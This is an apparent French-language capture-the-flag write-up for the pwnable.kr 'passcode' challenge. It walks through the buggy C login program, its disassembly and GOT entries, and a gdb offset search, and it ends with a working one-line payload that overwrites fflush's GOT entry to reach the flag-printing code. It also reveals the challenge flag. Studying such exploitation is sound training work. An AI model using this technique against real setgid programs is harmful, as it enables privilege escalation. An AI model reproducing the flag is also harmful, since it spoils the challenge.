# Passcode

## Description

Mommy told me to make a passcode based login system.
My first trial C implementation compiled without any error!
Well, there were some compiler warnings, but who cares about that?

ssh <passcode@pwnable.kr> -p2222 (pw:guest)

## Write up

flag : s0rry_mom_I_just_ign0red_c0mp1ler_w4rning

### Context

En arrivant sur le serveur, je check comme d'habitude ce qu'il y a dans les
documents. On voit que le flag est là et qu'on ne pourra pas le lire parce
qu'on n'a pas l'autorisation. J'imagine que c'est autour de ca que va se
jouer ce challenge.

```bash
passcode@ubuntu:~$ ls -la
total 52
drwxr-x---   5 root passcode      4096 Apr 19  2025 .
drwxr-xr-x 118 root root          4096 Jun  1  2025 ..
d---------   2 root root          4096 Jun 26  2014 .bash_history
-r--r-----   1 root passcode_pwn    42 Apr 19  2025 flag
dr-xr-xr-x   2 root root          4096 Aug 20  2014 .irssi
-rw-------   1 root root          1287 Jul  2  2022 .mysql_history
-r-xr-sr-x   1 root passcode_pwn 15232 Apr 19  2025 passcode
-rw-r--r--   1 root root           892 Apr 19  2025 passcode.c
drwxr-xr-x   2 root root          4096 Oct 23  2016 .pwntools-cache
-rw-------   1 root root           581 Jul  2  2022 .viminfo
```

### Analyse du code

En lisant le code, on remarque assez vite que le if statement utilise des
mots de passe hardcoded. C'est certain que ce ne sont pas les bons, mais
on est clairement invités à essayer (enfin c'est comme ca que je le comprends).
J'imagine que ca m'en dira plus sur les erreurs/warnings de compilation et
sur ce qu'on doit réussir à faire.

```c
 printf("checking...\n");
 if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
  setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
```

Ce qui donne :

```bash
passcode@ubuntu:~$ ./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : bob
Welcome bob!
enter passcode1 : 123456
enter passcode2 : 13371337
Segmentation fault
```

Je manque encore un peu des réflexes en C/C++ mais en retournant au code,
je comprends assez vite que l'erreur de segmentation est dûe au fait que
scanf() utilise directement passcode1/2 au lieu de &passcode1/2.
On essaye donc d'écrire quelque chose en utilisant une valeur non initialisée
comme adresse mémoire où écrire.

Il est donc nécessaire de trouver un autre moyen de contournement.

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
 int passcode1;
 int passcode2;

 printf("enter passcode1 : ");
 scanf("%d", passcode1);
 fflush(stdin);

 // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
 printf("enter passcode2 : ");
        scanf("%d", passcode2);

 printf("checking...\n");
 if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
  setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
  exit(0);
        }
}

void welcome(){
 char name[100];
 printf("enter you name : ");
 scanf("%100s", name);
 printf("Welcome %s!\n", name);
}

int main(){
 printf("Toddler's Secure Login System 1.1 beta.\n");

 welcome();
 login();

 // something after login...
 printf("Now I can safely trust you that you have credential :)\n");
 return 0; 
}
```

Comme on est dans des exercices de pwn, on va devoir passer par du
désassemblage ou au moins voir qu'est-ce qui se passe dans les adresses
lors de l'execution du programme.

Qui plus est, on voit ici plusieurs appels à printf(), scanf(), fflush(),
donc à `libc` qui font appel à la *Global Offset Table* ou GOT qui est
remplie par le linker au moment de l'édition des liens. Son exploitation,
ou plutôt son détournement, semble être un sujet récurrent en pwn.

[SystemOverlord : GOT and PLT for pwning](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)

À première vue, je pense que l'objectif ici est donc d'écraser l'entrée
de fflush() pour pointer vers `system("/bin/cat flag")`
En tout cas, c'est ce que je vais essayer de faire.

### Exploit

Vérifions d'abord si les adresses sont fixes. J'ai trouvé deux méthodes,
je mets les deux ici, pour le réutiliser au besoin :

La première utilise `file` et c'est la mention `LSB executable` qui permet
de voir que les adresses sont fixes. Dans le cas contraire, on aurait eu
`LSB shared object`

```bash
passcode@ubuntu:~$ file ./passcode
./passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=e24d23d6babbfa731aaae3d50c6bb1c37dc9b0af, for GNU/Linux 3.2.0, not stripped
```

La deuxième se fait avec `checksec` et est plus straight forward.
[Simple GOT Overwrite](https://blog.pwntools.com/posts/got-overwrite/)

Ca permet de confirmer que les adresses sont fixes, ce qui nous facilite un peu
la tâche parce qu'on ne devra pas utiliser de leak pour savoir où se trouvent
les choses.

```bash
passcode@ubuntu:~$ checksec --file ./passcode
[*] '/home/passcode/passcode'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Allons-y pour le disassemble de `login()`. Je mets juste les éléments
importants ici.

```bash
passcode@ubuntu:~$ gdb ./passcode
pwndbg> disassemble login
Dump of assembler code for function login:
   0x080491fb <+5>: sub    esp,0x10
# Prep de scanf pass 1
   0x0804921e <+40>: push   DWORD PTR [ebp-0x10]   <-- lit une valeur (pas une adresse)
   0x08049221 <+43>: lea    eax,[ebx-0x1fe5]       <-- calcule ebx-0x1fe5 et le met dans eax
   0x08049227 <+49>: push   eax                    <-- push l'adresse de la format string
   0x08049228 <+50>: call   0x80490d0 <__isoc99_scanf@plt> <-- appel de function

# Prep de fflush
   0x0804922d <+55>: add    esp,0x10                <-- ajoute 16 octets au pointeur de pile
   0x08049230 <+58>: mov    eax,DWORD PTR [ebx-0x4] <-- récupère l'adresse du ptr stdin
   0x08049236 <+64>: mov    eax,DWORD PTR [eax]     <-- déréférence pour obtenur la valeur
   0x08049238 <+66>: sub    esp,0xc                 <-- aligne la stack
   0x0804923b <+69>: push   eax                     <-- pousse stdin comme argument
   0x0804923c <+70>: call   0x8049060 <fflush@plt>  <-- la cible GOT

# même chose pour pass 2
   0x08049259 <+99>: push   DWORD PTR [ebp-0xc]
   0x0804925c <+102>: lea    eax,[ebx-0x1fe5]
   0x08049262 <+108>: push   eax
   0x08049263 <+109>: call   0x80490d0 <__isoc99_scanf@plt>

# Comparaison des pass entrés et jne si login failed
   0x0804927d <+135>: cmp    DWORD PTR [ebp-0x10],0x1e240
   0x08049284 <+142>: jne    0x80492ce <login+216>
   0x08049286 <+144>: cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x0804928d <+151>: jne    0x80492ce <login+216>

# Entrée dans le bloc d'execution d'un login valide.
   0x0804928f <+153>: sub    esp,0xc                <-- Adresse à passer à flush 
   0x08049292 <+156>: lea    eax,[ebx-0x1fc3]
   0x08049298 <+162>: push   eax
   0x08049299 <+163>: call   0x8049090 <puts@plt>
   0x0804929e <+168>: add    esp,0x10
   0x080492a1 <+171>: call   0x8049080 <getegid@plt>
   0x080492a6 <+176>: mov    esi,eax
   0x080492a8 <+178>: call   0x8049080 <getegid@plt>
End of assembler dump.
```

On a une bonne idée de ce qu'on veut faire maintenant, mais on a les entrée
dans le PLT, pas dans la GOT. Pour que `call fflush@plt` saute dans le bloc
d'execution du login valide, on doit trouver l'adresse de fflush dans la GOT.

```bash
passcode@ubuntu:~$ objdump -R ./passcode

./passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
[...]
0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804c01c R_386_JUMP_SLOT   getegid@GLIBC_2.0
0804c020 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804c024 R_386_JUMP_SLOT   system@GLIBC_2.0
0804c028 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804c02c R_386_JUMP_SLOT   setregid@GLIBC_20
```

On a maintenant :

1) L'adresse GOT de fflush : 0804c014
2) L'adresse pour entrer dans le bloc de login : 0x0804928f

On se rappelle que notre erreur de segmentation venait du fait que scanf()
essayait d'écrire un valeur à l'adresse contenue dans passcode1 à [ebp-0x10].
Si on arrive à écrire l'adresse GOT de fflush dans password1 et à donner
l'adresse du bloc login à fflush quand on appelle scanf(), `0x0804c014` ne
pointera plus vers la fonction fflush() mais vers le bloc de login.

Comme les adresse sont fixées à la compilation/édition des liens, l'ordre
d'execution sera suivi et on va sauter vers l'adresse du login.

Il ne reste qu'à trouver comment donner cette valeur à password1.

Dans le main, on voit que login() est appelée directement après welcome()
donc les deux fonctions vont utiliser le même espace mémoire à tour de rôle.
On doit donc tirer avantage du tableau de 100 caractères pour injecter
notre adresse.

On va utiliser gdb pour ca :

```bash
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> b login
Breakpoint 1 at 0x80491fb
pwndbg> r
Starting program: /home/passcode/passcode
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Toddler's Secure Login System 1.1 beta.
enter you name : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Welcome aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa!

Breakpoint 1, 0x080491fb in login ()
[...]
──────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────
 ► 0 0x80491fb login+5
   1 0x804939a main+54
   2 0xf7cf7519 __libc_start_call_main+121
   3 0xf7cf75f3 __libc_start_main+147
   4 0x804910c _start+44
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/wx $ebp-0x10
0xffeb3a58: 0x61616179
pwndbg> cyclic -l 0x61616179
Finding cyclic pattern of 4 bytes: b'yaaa' (hex: 0x79616161)
Found at offset 96
```

On génère un pattern unique de 100 char pour remplir le tableau qu'on utilise
comme nom. Quand on met un point d'arrêt sur login() et on regarde ce qui
se trouve à ebp-0x10. On calcule ensuite le offset.

Maintenant qu'on sait quel est le buffer à utiliser, il ne reste qu'à écrire
la commande en python pour envoyer le payload.

```bash

passcode@ubuntu:~$ (python3 -c 'import sys; sys.stdout.buffer.write(b"a"*96 + b"\x14\xc0\x04\x08")'; echo "134517391") | ./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
enter passcode1 : Login OK!
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
Now I can safely trust you that you have credential :)
```
